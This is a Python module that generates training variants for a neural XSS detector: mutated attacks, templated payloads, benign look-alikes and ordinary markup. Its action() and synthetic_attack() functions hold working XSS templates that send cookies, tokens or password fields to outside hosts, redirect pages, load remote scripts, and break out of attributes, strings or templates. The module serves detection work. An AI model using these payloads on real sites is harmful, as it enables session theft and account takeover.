"""Training-time variation for the neural XSS detector.

The public datasets are dominated by proof-of-concept payloads (`alert(1)`) that
stand alone in the input. Real attacks steal cookies or redirect, sit inside
ordinary text, HTML or URLs, and use any tag and event handler. Each epoch this
module produces a fresh set of training examples that covers those cases:

  varied attacks      training attacks with the proof-of-concept call swapped for a
                      real action, the handler renamed, or the quoting changed
  attacks in context  the same attacks placed inside benign text, a URL or JSON
  generated attacks   payloads built from templates (tag x handler x action)
  benign look-alikes  prose, code and maths that mention handlers, cookies or script
                      tags, or use call syntax, without injecting anything
  benign markup       plain links, navigation, buttons and form controls, and lone
                      words taken from the benign training rows
  swapped site names  in both classes, so that no site name predicts a label

Only training rows are varied. Validation and test rows are never touched.
The templates were written by hand, with the challenge set's past mistakes in view,
so the challenge set is a regression check for this model, not an independent test.
"""
from __future__ import annotations

import base64
import random
import re

import synthetic
from xss_model import WINDOW, normalize

EVENT_HANDLERS = """onabort onanimationend onanimationiteration onanimationstart onauxclick onbeforecopy onbeforecut
onbeforeinput onbeforeprint onbeforeunload onbegin onblur oncanplay oncanplaythrough onchange onclick onclose
oncontextmenu oncopy oncuechange oncut ondblclick ondrag ondragend ondragenter ondragleave ondragover ondragstart
ondrop ondurationchange onend onended onerror onfocus onfocusin onfocusout onhashchange oninput oninvalid onkeydown
onkeypress onkeyup onload onloadeddata onloadedmetadata onloadstart onmessage onmousedown onmouseenter onmouseleave
onmousemove onmouseout onmouseover onmouseup onmousewheel onpageshow onpaste onpause onplay onplaying onpointerdown
onpointerenter onpointerleave onpointermove onpointerout onpointerover onpointerup onpopstate onprogress onratechange
onrepeat onreset onresize onscroll onsearch onseeked onseeking onselect onshow onstart onsubmit ontimeupdate ontoggle
ontouchend ontouchmove ontouchstart ontransitionend onunload onvolumechange onwheel""".split()
_HANDLER = re.compile(r"\b(" + "|".join(sorted(EVENT_HANDLERS, key=len, reverse=True)) + r")(?=\s*=)")
_POC_CALL = re.compile(r"(?:alert|prompt|confirm)\s*\([^()]*\)")
_TAG_SPACE = re.compile(r"<([a-z][a-z0-9]*) (?=on)")
_WORD = re.compile(r"[a-z]{2,15}")

POC_CALLS = ["alert(1)", "alert(document.domain)", "alert(document.cookie)", "prompt(1)", "confirm(1)", "alert`1`",
             "alert('xss')", "alert(string.fromcharcode(88,83,83))", "print()", "console.log(1)", "alert(origin)"]
SECRETS = ["document.cookie", "document.cookie", "document.domain", "localstorage.getitem('token')", "localstorage.token",
           "sessionstorage.getitem('auth')", "document.body.innerhtml", "location.href", "btoa(document.cookie)",
           "encodeuricomponent(document.cookie)", "document.queryselector('input[type=password]').value"]
ATTACK_TAGS = """img svg body input button a video audio iframe details select textarea form marquee object embed
div p span b i h1 table td li section x keygen isindex math style link meta""".split()
TALK_NOUNS = ["handler", "attribute", "tag", "function", "element", "event", "policy", "tutorial", "method", "header", "api"]
TALK_TOPICS = EVENT_HANDLERS[:40] + ["alert()", "script", "iframe", "javascript", "cookie", "document.cookie", "eval()",
                                      "fetch()", "innerhtml", "<script>", "<img>", "<svg>", "addeventlistener", "xss"]


SHARED_HOSTS = """example.com www.example.com example.org example.net test.com localhost mysite.com google.com www.google.com
github.com youtube.com wikipedia.org en.wikipedia.org amazon.in facebook.com twitter.com microsoft.com apple.com yahoo.com
bing.com reddit.com stackoverflow.com""".split()
_HOST = re.compile(r"(?<=://)[a-z0-9][a-z0-9.-]*\.[a-z]{2,}|(?<=@)[a-z0-9][a-z0-9-]*(?:\.[a-z0-9-]+)*\.[a-z]{2,}")


def _host(rng: random.Random) -> str:
    if rng.random() < 0.3:
        return rng.choice(SHARED_HOSTS)
    return f"{rng.choice(synthetic.WORDS)}{rng.choice(['', str(rng.randint(1, 99))])}.{rng.choice(synthetic.TLDS)}"


def swap_host(text: str, rng: random.Random) -> str:
    """Replace one site name in a URL or e-mail address with another.

    Done to attacks and benign rows alike, from the same pool. Otherwise the network
    learns that certain sites mean "attack" (the public attack URLs come from a few
    sites) instead of looking at the payload.
    """
    host = _host(rng)
    return _HOST.sub(lambda _: host, text, count=1)


def _target(rng: random.Random) -> str:
    return rng.choice([f"https://{_host(rng)}/", f"//{_host(rng)}/", f"http://{_host(rng)}/{rng.choice(synthetic.WORDS)}",
                       f"https://{_host(rng)}/{rng.choice(synthetic.WORDS)}"])


def action(rng: random.Random) -> str:
    """What a real payload does instead of alert(1): steal, send, redirect or load more code."""
    url, secret, word, path = _target(rng), rng.choice(SECRETS), rng.choice(synthetic.WORDS), "/".join(rng.sample(synthetic.WORDS, 2))
    options = [
        f"fetch('{url}?c='+{secret})",
        f"fetch('{url}',{{method:'post',body:{secret}}})",
        f"fetch('/{path}',{{method:'post'}})",
        f"location='{url}?'+{secret}",
        f"location.href='{url}'",
        f"location.assign('{url}')",
        f"location.replace('{url}?d='+{secret})",
        f"window.location='{url}'",
        f"top.location='{url}'",
        f"document.location='{url}?c='+{secret}",
        f"new image().src='{url}?'+{secret}",
        f"navigator.sendbeacon('{url}',{secret})",
        f"import('{url}{word}.js')",
        f"$.getscript('{url}{word}.js')",
        f"$.post('/{path}',{{{word}:'{rng.choice(synthetic.WORDS)}@{_host(rng)}'}})",
        f"$.get('{url}?'+{secret})",
        f"document.write('<img src={url}?'+{secret}+'>')",
        f"document.forms[0].action='{url}'",
        f"var s=document.createelement('script');s.src='{url}{word}.js';document.head.appendchild(s)",
        f"eval(atob('{base64.b64encode(f'fetch({url!r})'.encode()).decode()}'))",
        "eval(location.hash.slice(1))",
        "eval(name)",
        f"settimeout(function(){{location.replace('{url}')}},{rng.randint(1, 900)})",
        f"this.src='{url}?'+{secret}",
        f"x=new xmlhttprequest();x.open('get','{url}?'+{secret});x.send()",
        f"window.open('{url}')",
        f"{word}()",
    ]
    return rng.choice(options)


def _code(rng: random.Random) -> str:
    return action(rng) if rng.random() < 0.6 else rng.choice(POC_CALLS)


def synthetic_attack(rng: random.Random) -> str:
    """A payload built from templates, covering structures the datasets rarely show."""
    code, tag, handler = _code(rng), rng.choice(ATTACK_TAGS), rng.choice(EVENT_HANDLERS)
    quote = rng.choice(['"', '"', "'", ""]) if not re.search(r"[\s>]", code) else rng.choice(['"', '"', "'"])
    if quote and quote in code:
        quote = "'" if quote == '"' else '"'
        if quote in code:
            code = rng.choice(POC_CALLS[:5])
    words = synthetic.phrase(rng, 1, 4)
    kind = rng.randrange(12)
    if kind <= 3:  # event handler on any tag
        extra = rng.choice(["", "", " autofocus", " src=x", f' class="{rng.choice(synthetic.WORDS)}"', ' href="#"', " open", " contenteditable"])
        closing = rng.choice([f">{words}</{tag}>", ">", f">{words}", "/>"])
        text = f"<{tag}{extra}{rng.choice([' ', ' ', '/'])}{handler}={quote}{code}{quote}{closing}"
    elif kind == 4:
        text = rng.choice([f"<script>{code}</script>", f"<script>{code};</script>", f"<svg><script>{code}</script></svg>",
                           f"</script><script>{code}</script>", f"<script src={_target(rng)}{rng.choice(synthetic.WORDS)}.js></script>",
                           f'<script src="{_target(rng)}{rng.choice(synthetic.WORDS)}.js"></script>'])
    elif kind == 5:  # javascript: URLs
        attr = rng.choice(["a href", "iframe src", "form action", "object data", "embed src", "button formaction", "area href"])
        text = f'<{attr}="{rng.choice(["javascript:", "javascript:", " javascript:", "java script:"])}{code.replace(chr(34), chr(39))}">{words}'
    elif kind == 6:  # documents inside attributes
        inner = f"<script>{code.replace(chr(34), chr(39))}</script>"
        encoded = base64.b64encode(inner.encode()).decode()
        text = rng.choice([f'<iframe srcdoc="{inner}">', f'<iframe src="data:text/html,{inner}"></iframe>',
                           f'<a href="data:text/html;base64,{encoded}">{words}</a>', f'<object data="data:text/html;base64,{encoded}">',
                           f'<embed src="data:text/html,{inner}">'])
    elif kind == 7:  # template injection
        text = rng.choice([f"{{{{constructor.constructor('{code.replace(chr(39), chr(34))}')()}}}}",
                           f"{{{{$on.constructor('{code.replace(chr(39), chr(34))}')()}}}}",
                           f"{{{{{words.split()[0]}.constructor.constructor('{code.replace(chr(39), chr(34))}')()}}}}"])
    elif kind == 8:  # breaking out of a JavaScript string
        text = rng.choice([f"';{code}//", f'";{code}//', f"'-{code}-'", f'"-{code}-"', f"');{code};//", f"\\';{code}//", f"</script><svg {handler}={code}>"])
    elif kind == 9:  # breaking out of an attribute
        text = rng.choice([f'"><{tag} {handler}={code}>', f"'><{tag} {handler}={code}>", f"' {handler}='{code}", f'" {handler}="{code}" x="',
                           f'"><script>{code}</script>', f"{words}\"{rng.choice([' ', '/'])}{handler}={code} "])
    elif kind == 10:  # style and meta vectors
        text = rng.choice([f'<div style="background:url(javascript:{code})">', f"<style>@import 'javascript:{code}';</style>",
                           f'<meta http-equiv="refresh" content="0;url=javascript:{code}">', f'<base href="javascript:{code}//">'])
    else:  # a benign-looking element carrying a handler
        text = synthetic.html_fragment(rng) + f"<{tag} {handler}={quote}{code}{quote}>{words}</{tag}>"
    return text


def benign_lookalike(rng: random.Random) -> str:
    """Harmless text that shares vocabulary with attacks: prose about code, and plain code."""
    a, b, c = (rng.choice(synthetic.WORDS) for _ in range(3))
    topic, other = rng.choice(TALK_TOPICS), rng.choice(TALK_TOPICS)
    options = [
        f"the {topic} {rng.choice(TALK_NOUNS)} {rng.choice(['is', 'was', 'can be'])} {a} {b}",
        f"what's the difference between {topic} and {other}?",
        f"learn how {rng.choice(TALK_NOUNS)}s like {topic} and {other} work in html",
        f"use the {topic} {rng.choice(TALK_NOUNS)} carefully in {a} code",
        f"how do i {rng.choice(['use', 'remove', 'test', 'debug', 'block'])} {topic} in my {a} {b}?",
        f"i love the {topic} {rng.choice(TALK_NOUNS)} tutorial on {a}",
        f"redirecting you to the {rng.choice(['document', 'cookie', 'script', 'privacy'])} {rng.choice(['cookie', 'policy', 'settings'])} {rng.choice(['policy', 'page'])}",
        f"the <{rng.choice(['video', 'audio', 'img', 'script', 'iframe', 'svg', 'form', 'input'])}> element supports {a} and {b}.",
        f'git commit -m "fix: handle <{rng.choice(["br", "script", "img", "p"])}> tags in {a}"',
        f'const {a} = document.getelementbyid("{b}");',
        f'const {a} = document.queryselector(".{b}-{c}");',
        f'{a}.addeventlistener("{rng.choice(["click", "load", "submit", "input"])}", {b});',
        f"console.log({a}, {b}.length);",
        f'fetch("/api/{a}").then(({b}) => {b}.json());',
        f"if (response.status >= 200 && response.status < 300) {{ {a}(response); }}",
        f"window.{a} = {a} || {{}};",
        f'import {{ {a} }} from "./{b}.js";',
        f"{a}.onclick = {b};",
        f"security review: {rng.choice(['xss', 'csrf', 'sql injection', 'clickjacking'])} in the {a} {b} was {rng.choice(['fixed', 'reported', 'closed'])}",
        f"the script was written by the {a}'s {b}",
        f"alert: {synthetic.sentence(rng)}",
        f"{a} onload {b} online {c} onerror",
    ]
    if rng.random() < 0.5:  # ordinary code and maths: calls and brackets without any injection
        n, m = rng.randint(0, 99), rng.randint(2, 500)
        call = rng.choice([
            f'print("{synthetic.phrase(rng, 1, 3)}")', f"print({a})", f'console.log("{synthetic.phrase(rng, 1, 3)}");', f'printf("%d\\n", {a});',
            f"return {a}({b}, {c});", f"{a} = {b}({c})", f"def {a}({b}, {c}): return {b} + {c}", f"{a}.{b}({c})", f"len({a}) > {n}",
            f"max({n}, {m})", f"f(x) = {n}x + {m}", f"{a[0]}(x^y) = {a[0]}(x)^({a[0]}(y))", f"sin(x) / cos(x) = tan(x)", f"=sum(a1:a{m})",
            f"select count(*) from {a} where {b} = {n}", f"{a}({n}) is {rng.choice(['true', 'false', 'undefined', str(m)])}",
            f'system.out.println("{synthetic.phrase(rng, 1, 3)}");', f"{a} := make([]{b}, {n})", f"std::cout << {a}({b}) << std::endl;",
        ])
        options = [call, call, f"<code>{call}</code>", f"<pre>{call}</pre>", f"`{call}`", f"```{rng.choice(['python', 'js', 'java', ''])} {call} ```",
                   f"is it true that {call}?", f"here's an example: {call}", f"{synthetic.sentence(rng)} {call}",
                   f"**{a}** and [{synthetic.phrase(rng, 1, 2)}](https://{_host(rng)}{rng.choice(['', '/', '/' + b])})",
                   f"{a}.{b}@{_host(rng)}", f"visit {_host(rng)} {rng.choice(['today', 'for details', 'to sign up'])}"]
    return rng.choice(options)


def benign_markup(rng: random.Random) -> str:
    """Everyday interface HTML without script: links to site paths, navigation, buttons, form controls.

    The datasets' benign rows are prose, URLs and code, so without these the network
    treats any short tag it has only met inside attacks as an attack.
    """
    def word() -> str:
        return rng.choice(synthetic.WORDS)

    def label() -> str:
        return synthetic.phrase(rng, 1, 2)

    def path() -> str:
        return rng.choice(["/", "/", "#", "#top", "./", "../", "index.html", f"/{word()}", f"/{word()}/{word()}", f"{word()}.html",
                           f"../{word()}.html", f"?{rng.choice(synthetic.PARAMS)}={synthetic.value(rng)}",
                           f"/{word()}?{rng.choice(synthetic.PARAMS)}={synthetic.value(rng)}"])

    def extra() -> str:
        return rng.choice(["", "", "", f' class="{word()}"', f' class="{word()} {word()}-{word()}"', f' id="{word()}"', f' title="{label()}"',
                           ' target="_blank" rel="noopener"', f' data-{word()}="{rng.randint(1, 9999)}"', f' aria-label="{label()}"',
                           f' role="{rng.choice(["button", "alert", "navigation", "status", "tab"])}"', " disabled", " hidden"])

    def link() -> str:
        return f'<a href="{path()}"{extra()}>{label()}</a>'

    kind = rng.randrange(12)
    if kind <= 1:
        return link()
    if kind == 2:
        return f"<{rng.choice(['ul', 'ol'])}{extra()}>" + "".join(f"<li>{link()}</li>" for _ in range(rng.randint(1, 4))) + "</ul>"
    if kind == 3:
        joined = rng.choice([" | ", " ", " > ", " / ", ""]).join(link() for _ in range(rng.randint(2, 4)))
        return rng.choice([f"<nav{extra()}>{joined}</nav>", joined, f"{joined} > {label()}"])
    if kind == 4:
        return f'<button{rng.choice(["", " type=submit", chr(32) + "type=" + chr(34) + rng.choice(["submit", "button", "reset"]) + chr(34)])}{extra()}>{label()}</button>'
    if kind == 5:
        control = (f'<input type="{rng.choice(["text", "email", "number", "date", "search", "checkbox", "radio", "tel", "hidden"])}" name="{word()}"'
                   f'{rng.choice(["", " required", " checked", f" id={chr(34)}{word()}{chr(34)}", f" placeholder={chr(34)}{label()}{chr(34)}", f" value={chr(34)}{synthetic.value(rng)}{chr(34)}"])}>')
        return rng.choice([control, f'<label for="{word()}">{label()}</label>', f'<label for="{word()}">{label()}</label> {control}', f"{control} <label>{label()}</label>"])
    if kind == 6:
        options = "".join(f'<option value="{word()}"{rng.choice(["", "", " selected"])}>{label()}</option>' for _ in range(rng.randint(1, 3)))
        return rng.choice([f'<select name="{word()}"{extra()}>{options}</select>', options, f'<textarea name="{word()}" rows="{rng.randint(2, 8)}"></textarea>'])
    if kind == 7:
        tag = rng.choice(["div", "span", "footer", "header", "p", "section", "small", "li", "td", "dd", "dt", "address", "time", "abbr", "progress", "thead"])
        return f"<{tag}{extra()}{extra()}>{rng.choice([label(), link(), f'{label()} {link()}', str(rng.randint(0, 100)) + '%'])}</{tag}>"
    if kind == 8:
        return f"{label()} {link()} {synthetic.sentence(rng)}"
    if kind == 9:
        return rng.choice([f"<dl><dt>{label()}</dt><dd>{label()}</dd></dl>", f'<tr><th scope="col">{label()}</th><td>{rng.randint(1, 999)}</td></tr>',
                           f"<kbd>{word()}</kbd> + <kbd>{word()[0]}</kbd> {label()}", f"<sup>{rng.randint(1, 9)}</sup> {synthetic.sentence(rng)}"])
    if kind == 10:
        return rng.choice([f"{word()}: {rng.randint(0, 40)}px {rng.choice(['auto', 'solid', '0'])}; {word()}: {rng.randint(0, 9)}px;",
                           f"{rng.choice(['npm install', 'pip install', 'git clone', 'apt install', 'cd'])} {rng.choice(['--save ', '-g ', ''])}{word()}",
                           f"{rng.choice(['order', 'ticket', 'invoice', 'ref'])} #{rng.randint(100, 99999)} {word()}"])
    return f'<a href="{rng.choice(["tel:+", "sms:+"])}{rng.randint(10**9, 10**11)}">{label()}</a>'


def _snippet(rng: random.Random, benign: list[str], limit: int = 250) -> str:
    text = rng.choice(benign)
    if len(text) > limit:
        start = rng.randrange(len(text) - limit)
        text = text[start : start + limit]
    return text


def augment_attack(text: str, rng: random.Random, benign: list[str]) -> str:
    """A varied copy of one training attack. Still an attack."""
    # A row that is little more than `alert(1)` stays as it is: swapped, it would be a
    # bare function call, which is what ordinary code looks like.
    if len(_POC_CALL.sub("", text)) >= 8 and rng.random() < 0.45:
        replacement = action(rng)
        text = _POC_CALL.sub(lambda _: replacement, text)
    if rng.random() < 0.3:
        text = swap_host(text, rng)
    if rng.random() < 0.2:
        replacement = rng.choice(EVENT_HANDLERS)
        text = _HANDLER.sub(replacement, text, count=1)
    if rng.random() < 0.15:
        text = rng.choice([lambda t: t.replace('"', "'"), lambda t: _TAG_SPACE.sub(r"<\1/", t),
                           lambda t: t.replace(" =", "=").replace("= ", "=")])(text)
    if len(text) <= 600 and rng.random() < 0.45:
        kind = rng.randrange(10)
        if kind < 5:  # inside ordinary text or HTML
            before = _snippet(rng, benign) if rng.random() < 0.7 else ""
            after = _snippet(rng, benign) if rng.random() < 0.5 else ""
            text = before + rng.choice([" ", " ", "", '">', "'>", "<br>", "</p>"]) + text + rng.choice([" ", ""]) + after
        elif kind < 8 and not text.startswith("http"):  # as a query parameter
            url = synthetic.url(rng)
            text = f"{url}{'&' if '?' in url else '?'}{rng.choice(synthetic.PARAMS)}={text}"
        else:  # as a form or JSON field
            key = rng.choice(synthetic.PARAMS)
            text = rng.choice([f"{key}={synthetic.value(rng)}&{rng.choice(synthetic.PARAMS)}={text}",
                               f'{{"{key}": "{text}", "id": {rng.randint(1, 9999)}}}'])
    return normalize(text)[:WINDOW]


def augment_benign(text: str, rng: random.Random, benign: list[str]) -> str:
    """A varied copy of one benign row: joined with another benign row, or cut somewhere."""
    if rng.random() < 0.7:
        text = text[: WINDOW // 2] + rng.choice([" ", " ", "", "<br>"]) + _snippet(rng, benign, WINDOW // 2)
    elif len(text) > 40:
        start = rng.randrange(len(text) // 2)
        text = text[start : start + rng.randint(20, WINDOW)]
    return normalize(text)[:WINDOW] or text


def epoch_examples(texts: list[str], labels: list[int], rng: random.Random, generated_share: float = 0.06) -> tuple[list[str], list[int]]:
    """This epoch's training set: every original row, plus fresh variants and generated rows."""
    benign = [text for text, label in zip(texts, labels) if label == 0]
    out_texts, out_labels = [], []

    def add(text: str, label: int) -> None:
        if text:
            out_texts.append(text)
            out_labels.append(label)

    for text, label in zip(texts, labels):
        if label == 1:
            add(text, 1)
            if rng.random() < 0.5:
                add(augment_attack(text, rng, benign), 1)
        else:
            if rng.random() < 0.15:
                text = swap_host(text, rng)
            add(augment_benign(text, rng, benign) if rng.random() < 0.12 else text, 0)
    count = int(generated_share * len(texts))
    for _ in range(count):
        add(normalize(synthetic_attack(rng))[:WINDOW], 1)
        generated = normalize(rng.choice([synthetic.html_fragment, synthetic.url, synthetic.misc])(rng))[:WINDOW]
        add(swap_host(generated, rng) if rng.random() < 0.3 else generated, 0)
        add(normalize(benign_lookalike(rng)), 0)
        add(normalize(benign_markup(rng)), 0)
    # Lone words and short word groups, drawn from the benign training rows themselves.
    vocabulary = [token for text in rng.sample(benign, min(2000, len(benign))) for token in _WORD.findall(text[:300])]
    for _ in range(count // 2 if vocabulary else 0):
        add(" ".join(rng.choice(vocabulary) for _ in range(rng.choice([1, 1, 2, 3]))), 0)
    return out_texts, out_labels
